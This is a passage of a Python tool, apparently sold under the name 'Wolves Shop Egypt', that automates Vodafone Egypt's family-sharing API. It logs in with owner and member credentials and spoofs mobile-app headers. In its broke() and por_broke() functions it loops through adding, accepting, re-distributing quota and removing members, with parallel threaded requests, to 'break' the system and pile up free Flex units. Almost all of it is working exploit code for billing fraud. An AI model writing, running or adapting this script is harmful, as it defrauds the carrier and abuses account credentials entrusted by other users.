                        "id": [{"value": num, "schemeName": "MSISDN"}],
                        "type": "Member"
                    }
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {
                            "characteristicName": "quotaDist1",
                            "value": value,
                            "type": "percentage"
                        }
                    ]
                }
            }
        }

        response = requests.patch(url, json=payload, headers=headers)

        print(response.status_code)
        print(response.text)

def send_invite(ownerToken, memberNum, ownerNum,  value):
    headers = {
        'Accept': 'application/json',
        'Authorization': ownerToken,
        'Content-Type': 'application/json',
        'msisdn': ownerNum,
        'clientId': 'WebsiteConsumer',
    }

    json_data = {
        'name': 'FlexFamily',
        'type': 'SendInvitation',
        'category': [
            {'value': '523', 'listHierarchyId': 'PackageID'},
            {'value': '47', 'listHierarchyId': 'TemplateID'},
            {'value': '523', 'listHierarchyId': 'TierID'},
            {'value': 'percentage', 'listHierarchyId': 'familybehavior'},
        ],
        'parts': {
            'member': [
                {'id': [{'value': ownerNum, 'schemeName': 'MSISDN'}], 'type': 'Owner'},
                {'id': [{'value': memberNum, 'schemeName': 'MSISDN'}], 'type': 'Member'},
            ],
            'characteristicsValue': {
                'characteristicsValue': [
                    {'characteristicName': 'quotaDist1', 'value': value, 'type': 'percentage'},
                ],
            },
        },
    }

    try:
        response = requests.post(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=json_data,
            timeout=10
        )
        return {
            'status': response.status_code,
            'text': response.text[:200],  # اختصر العرض
        }
    except Exception as e:
        return {'status': 'error', 'text': str(e)}

def accept(nu, nu2, token) -> str:

    if token != "error":
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        headers = {
            "api-host": "ProductOrderingManagement",
            "useCase": "MIProfile",
            "Authorization": token,
            "api-version": "v2",
            "x-agent-operatingsystem": "11",
            "clientId": "AnaVodafoneAndroid",
            "x-agent-device": "Samsung_Galaxy_A52",
            "x-agent-version": "2024.7.1",
            "x-agent-build": "600",
            "msisdn": nu2,
            "Accept": "application/json",
            "Accept-Language": "ar",
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "mobile.vodafone.com.eg",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.11.0"
        }
        data = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "name": "FlexFamily",
            "parts": {
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": nu}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": nu2}], "type": "Member"}
                ]
            },
            "type": "AcceptInvitation"
        }
        aa = requests.patch(url, headers=headers, json=data)
        Accept = aa.text
        if str(Accept) in['{}', '201', '200']:
            print(light_green_color,f"invetation accepted, code:[{aa.status_code}] success \n in {datetime.now().time()}")
        elif "Customer not eligible-Family member" in str(Accept):
            print(yellow_color,f"({nu2}) is alredy Family member")
        else:
            print(red_color, f"response when try accepting invetation: {Accept}")
            print(red_color, f"error when accepting invetation, code:[{aa.status_code}] failed")
    else:
        print("")
        print(red_color,f"({nu2}) wrong number or password")
        return 0

def acceptInvetation(on, mn, mp):
    token=get_authorization(mn, mp)

    if token != "error":
        # Extract the token from the response
        # token = response.json().get('access_token')
        # print(f"Token received: {token}")

        # URLs for the next requests
        api_url = 'https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup'

        # Common headers for the second request
        headers = {
            'x-dynatrace': 'MT_3_17_258613803_3-0_a556db1b-4506-43f3-854a-1d2527767923_0_384_568',
            'Authorization': f'Bearer {token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '14',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Realme RMX3636',
            'x-agent-version': '2025.3.3',
            'x-agent-build': '979',
            'msisdn': mn,
            'Accept': 'application/json',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'mobile.vodafone.com.eg',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/4.11.0'
        }

        # Data for the request (AcceptInvitation using the same MSISDN for Owner and Member)
        data1 = {
            "category": [
                {"listHierarchyId": "PackageID", "value": "522"},
                {"listHierarchyId": "TemplateID", "value": "47"},
                {"listHierarchyId": "TierID", "value": "523"}
            ],
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "type": "percentage", "value": "30"}
                    ]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": mn}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": mn}], "type": "Member"}
                ]
            },
            "type": "AcceptInvitation"
        }

        # Send the request (AcceptInvitation)
        response2 = requests.post(api_url, headers=headers, json=data1)

        if response2.status_code == 200:
            print("دعوة تم قبولها بنجاح")
            print("الاستجابة:", response2.json())
        else:
            print(f"فشل قبول الدعوة. رمز الحالة: \n{response2}")
    else:
        print(f"فشل التوثيق. رمز الحالة:")

def accept_invitation( msisdn: str, member_pass: str, owner_msisdn: str):
    token = get_authorization(msisdn, member_pass)
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        "api-host": "ProductOrderingManagement",
        "useCase": "MIProfile",
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "x-agent-operatingsystem": "11",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Samsung_Galaxy_A52",
        "x-agent-version": "2024.7.1",
        "x-agent-build": "600",
        "msisdn": msisdn,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }
    data = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner_msisdn}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": msisdn}], "type": "Member"}
            ]
        },
        "type": "AcceptInvitation"
    }

    response = requests.patch(url, headers=headers, json=data)
    response.raise_for_status()
    return "Invitation accepted"

def get_plan_name(token: str, msisdn: str) -> str:
    url = "https://web.vodafone.com.eg/o/VodafoneDDLRecordRest/records/get/en/233987/PlanID/523?v=0.0.59999_production"
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.7,en;q=0.6",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
        "Authorization": f"Bearer {token}",
        "msisdn": msisdn
    }

    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        raise Exception(f"HTTP Error: {response.status_code}")
    
    data = response.json()
    return data.get("PlanName", "Unknown")

def owner_flexes(n,p):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup?type=Family&$.parts.member.type=owner"
    headers = {
        "Accept": "application/json",
        "Accept-Language": "EN",
        "Authorization": get_authorization(n,p),
        "Content-Type": "application/json",
        "clientId": "WebsiteConsumer",
        "msisdn": n,
        "User-Agent": "Mozilla/5.0"
    }


    response = requests.get(url, headers=headers)
    ownerFlexes=f"unknown [{response.text}]"
    if response.status_code == 200:
        data = response.json()
        try:
            # نبحث عن الـ Owner ونجيب characteristicName = "flex"
            members = data[0]["parts"]["member"]
            ownerFlexes=members
            for member in members:
                if member["type"] == "Owner":
                    for char in member["characteristic"]["characteristicsValue"]:
                        if char["characteristicName"] == "flex":
                            ownerFlexes=char["value"]
        except Exception as e:
            print("Error parsing JSON:", e)
    return ownerFlexes

def getFlexes(token,n):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': n,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = requests.get(
        f'https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={n}&@type=aggregated',
        headers=headers,)
    
    data = response.json()

    # البحث عن FLEX بقيمة Remaining
    for item in data:
        if item.get("@type") == "OTHERS":
            for bucket in item.get("bucket", []):
                if bucket.get("usageType") == "limit":
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining" and balance["remainingValue"]["units"] == "FLEX":
                            return balance["remainingValue"]["amount"]

    return None  # لو ما لقى القيمة

def QuotaRedistribution(on, mn, token, value = 40) -> str:
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://web.vodafone.com.eg',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        "User-Agent": "okhttp/4.11.0",
        "x-agent-operatingsystem": "11",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Samsung_Galaxy_A52",
        "x-agent-version": "2024.7.1",
        "x-agent-build": "600",
        'msisdn': on,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
    }

    json_data = {
        'name': 'FlexFamily',
        'type': 'QuotaRedistribution',
        'category': [
            {
                'value': '47',
                'listHierarchyId': 'TemplateID',
            },
            {
                'value': 'percentage',
                'listHierarchyId': 'familybehavior',
            },
        ],
        'parts': {
            'member': [
                {
                    'id': [
                        {
                            'value': on,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Owner',
                },
                {
                    'id': [
                        {
                            'value': mn,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Member',
                },
            ],
            'characteristicsValue': {
                'characteristicsValue': [
                    {
                        'characteristicName': 'quotaDist1',
                        'value': value,
                        'type': 'percentage',
                    },
                ],
            },
        },
    }
    time.sleep(1)
    response = requests.patch(url, headers=headers, json=json_data)
    x= "1300"
    if value == 40:
        x="5200"
    if str(response.status_code) in ['200','201','{}']:
        print(light_green_color,f"update {mn} to {x} :[{response.status_code}] success\n in {datetime.now().time()}")
    else:
        print(red_color,f"update {mn} to {x} :[{response.text}] failed")
        
    return response.status_code

def removeMember(on, token, mn)-> str:



    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': token,  # لازم يكون جديد وصالح
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Origin': 'https://web.vodafone.com.eg',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
        'x-agent-operatingsystem': '11',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung_Galaxy_A52',
        'x-agent-version': '2024.7.1',
        'x-agent-build': '600',
        'msisdn': on,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    }

    payload = {
        "name": "FlexFamily",
        "type": "FamilyRemoveMember",
        "category": [
            {"value": "47", "listHierarchyId": "TemplateID"}
        ],
        "parts": {
            "member": [
                {"id": [{"value": on, "schemeName": "MSISDN"}], "type": "Owner"},
                {"id": [{"value": mn, "schemeName": "MSISDN"}], "type": "Member"}
            ],
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "Disconnect", "value": "0"},
                    {"characteristicName": "LastMemberDeletion", "value": "1"}
                ]
            }
        }
    }
    response = requests.patch(url, headers=headers, json=payload)
    return response.status_code

def wait(sec, text="waiting"):
    for remaining in range(sec, 0, -1):#wait 5 min
        mins, secs = divmod(remaining, 60)
        print(white_color,f"{text}: {mins:02}:{secs:02}", end="\r")
        time.sleep(1)

def broke(on, op, n1, p1, n2, p2, count)->str:

    owner_token = get_authorization(on, op)
    n2_token = get_authorization(n2, p2)
    for x in range(count):
        members = get_active_members(on, owner_token)
        print(members)
        flex_value = None
        for item in members:
            if item['msisdn'] == str(f"2{n1}"):
                flex_value = item['flex']
                break
        print(f'{n1} flex is {flex_value}')
        try:
            print(f"iteration[{x+1}]")
            print(f"{n1} flexes is {flex_value}")
            if str(flex_value) in ['5200', '2600']:
                for i in range(4,0,-1):
                    QuotaRedistribution_code =QuotaRedistribution(on,n1, owner_token, 10)
                    if(str(QuotaRedistribution_code) == "555" or str(QuotaRedistribution_code) == "201"):
                        break
                    for remaining in range(60, 0, -1):#wait 1 min
                        mins, secs = divmod(remaining, 60)
                        print(yellow_color,f"Retry Wait Timeout:  {mins:02}:{secs:02}", end="\r")
                        time.sleep(1)
                for remaining in range(300, 0, -1):#wait 5 min
                    mins, secs = divmod(remaining, 60)
                    print(white_color,f"waiting: {mins:02}:{secs:02}", end="\r")
                    time.sleep(1)
            elif flex_value == None:
                    addMember(on, n1, owner_token, 10)
                    time.sleep(5)
                    accept(on, n1, get_authorization(n1, p1))
                    for remaining in range(300, 0, -1):#wait 5 min
                        mins, secs = divmod(remaining, 60)
                        print(white_color,f"waiting: {mins:02}:{secs:02}", end="\r")
                        time.sleep(1)
            else:
                print(f'{n1} in alredy has 1300 flex')

            added=addMember(on, n2, owner_token, 40)
            if any(code in str(added) for code in ["{}", "200", "201"]) or "You have reached the maximum number of family" in added.text:
                print(light_green_color+f"{n2} added :[{added.status_code}] success")
                Thread(target=QuotaRedistribution,args=(on, n1, owner_token, 40)).start()
                Thread(target=accept,args=(on, n2, n2_token)).start()
                time.sleep(5)
                
                for i in range(5):  # عدد المحاولات الأقصى
                    remove_code = removeMember(on, owner_token, n2)
                    time.sleep(3)
                    members = get_active_members(on, owner_token)
                    flex_value = None
                    for item in members:
                        if item['msisdn'] == str(f"2{n2}"):
                            flex_value = item['msisdn']
                            break
                    if flex_value == None:
                        print(light_green_color,f"({n2}) is deleted ✅")
                        break
                    else:
                        print(red_color,f"error code: {remove_code}")
                        for remaining in range(60, 0, -1):
                            mins, secs = divmod(remaining, 60)
                            print(yellow_color,f"Retry delete ({n2}) Wait Timeout: {mins:02}:{secs:02}", end="\r")
                            time.sleep(1)
                else:
                    print(red_color,f"can't delete the member ({n2})❌")
                    return f"can't delete the member ({n2})❌"
                # print("removeing 2nd member code:",remove_code)
                if '201' in str(remove_code) :
                    print(light_blue_color+f"done[{x+1}]\n{owner_flexes(on,op)} Flexes\n")

            else:
                print(red_color,f"Error in adding Member {n2}:{added.text}")
                for remaining in range(60, 0, -1):
                    mins, secs = divmod(remaining, 60)
                    print(yellow_color,f"Retry Wait Timeout: {mins:02}:{secs:02}", end="\r")
                    time.sleep(1)
                    
            for remaining in range(300, 0, -1):
                    mins, secs = divmod(remaining, 60)
                    print(white_color,f"Time remaining: {mins:02}:{secs:02}", end="\r")
                    time.sleep(1)
        except Exception as e:
            print(red_color,f"ERROR: {e}")
            time.sleep(5)
            
def por_broke(on,op,n1,n2,p2, count):  
    print("") 
    for x in range(count):
        if x%10 == 0:
            if x != 0:
                print(f"updating tokens")
            owner_token = get_authorization(on, op)
            n2_token = get_authorization(n2, p2) 
        members = get_active_members(on, owner_token)
        # print(members)
        flex_value = None
        for item in members:
            if item['msisdn'] == str(f"2{n1}"):
                flex_value = item['flex']
                break
        for o in range(4):
                if str(flex_value) not in "1300":
                    QuotaRedistribution_code =QuotaRedistribution(on,n1, owner_token, 10)
                    wait(305)
                    if str(QuotaRedistribution_code) in '201':
                        break
                    elif o>3:
                        return
        for i in range(6):
            added =addMember(on, n2, owner_token, 10)
            wait(10)
            if str(added.status_code) in ['200', '201', '{}', '555']:
                break
            elif i>5:
                return
        
        time.sleep(5)
        Thread(target=accept,args=(on, n2, n2_token)).start()
        Thread(target=QuotaRedistribution,args=(on, n1, owner_token, 40)).start()
        time.sleep(10)

        for i in range(5):  # عدد المحاولات الأقصى
            remove_code = removeMember(on, owner_token, n2)
            time.sleep(3)
            members = get_active_members(on, owner_token)
            flex_value = None
            for item in members:
                if item['msisdn'] == str(f"2{n2}"):
                    flex_value = item['msisdn']
                    break
            if flex_value == None:
                print(light_green_color,f"({n2}) is deleted ✅")
                print(light_blue_color+f"done[{x+1}] - {int(getFlexes(owner_token, on))} Flex\nat {datetime.now().time()} \n")
                break
            else:
                print(red_color,f"error code: {remove_code}")
                wait(10, f"Retry delete ({n2}) Wait Timeout")
        else:
            print(red_color,f"can't delete the member ({n2})❌")
            return f"can't delete the member ({n2})❌"
        # print("removeing 2nd member code:",remove_code)

        wait(301)



print("👋 أهلاً بك في Wolves Shop Egypt!\n💡 نحن هنا نجعل عالم التكنولوجيا أفضل وأسهل.\n🚀 انطلق معنا الآن!")
print('-'*30)
print(' ')

owner_number =input("رقم الأونر:")
owner_pass =input("كلمة سر الأونر:")
m1_number =input("رقم الفرد المضاف:")
m2_number =input("رقم الفرد:")
m2_pass =input("كلمة الشر للفرد الفرد:")
count = int(input("عدد مرات الكسر:"))
xo=por_broke(owner_number, owner_pass, m1_number, m2_number, m2_pass, count)
print(xo)
print('Done, nice work!')

